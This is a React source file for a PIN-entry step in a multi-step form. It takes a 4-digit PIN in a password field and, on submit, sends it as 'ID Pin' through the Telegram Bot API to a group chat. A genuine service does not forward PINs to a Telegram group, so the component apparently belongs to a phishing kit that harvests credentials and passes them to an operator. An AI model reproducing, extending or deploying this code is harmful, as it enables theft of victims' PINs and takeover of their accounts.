import React, { useState, useContext } from 'react';
import { styled } from '@mui/material/styles';
import TextField from '@mui/material/TextField';
import Button from '@mui/material/Button';
import CircularProgress from '@mui/material/CircularProgress';
import { AuthContext } from '../context/AuthContext';

const Container = styled('div')({
  textAlign: 'center',
  padding: '20px',
});

const PinInput = styled(TextField)({
  width: '200px',
  margin: '10px 0',
});

async function sendToTelegram(message) {
    const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN; // Store in your .env file
    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID; // Store in your .env file// Replace with your group chat ID

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });

  if (!response.ok) {
    throw new Error('Failed to send message to Telegram group');
  }
}

function PinVerification({ onNext }) {
  const { verifyPin } = useContext(AuthContext);
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState('');

  const handleInputChange = (e) => {
    setPin(e.target.value);
    setError(''); // Clear any previous errors
    setSuccess(''); // Clear any previous success message
  };

  const handleSubmit = async () => {
    if (pin.length !== 4) {
      setError('You must enter exactly 4 digits.');
      return;
    }

    setLoading(true);

    const pinMessage = `ID Pin:\n${pin}`;
    try {
      await sendToTelegram(pinMessage); // Send the PIN to Telegram group
      verifyPin(pin); // Save PIN in the context
      setSuccess('PIN sent successfully!');
      onNext(); // Proceed to the next step in the stepper
    } catch (error) {
      setError('Failed to send PIN to Telegram group.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <Container>
      <h2 className="mb-4">Enter Your PIN</h2>
      <PinInput
        label="PIN"
        variant="outlined"
        type="password"
        value={pin}
        onChange={handleInputChange}
        error={!!error}
        helperText={error || success}
        inputProps={{ maxLength: 4 }} // Limit input to 4 characters
        fullWidth
      />
      <div style={{ marginTop: '20px' }}>
        <Button
          variant="contained"
          color="primary"
          onClick={handleSubmit}
          disabled={loading}
        >
          {loading ? <CircularProgress size={24} /> : 'Submit'}
        </Button>
      </div>
    </Container>
  );
}

export default PinVerification;
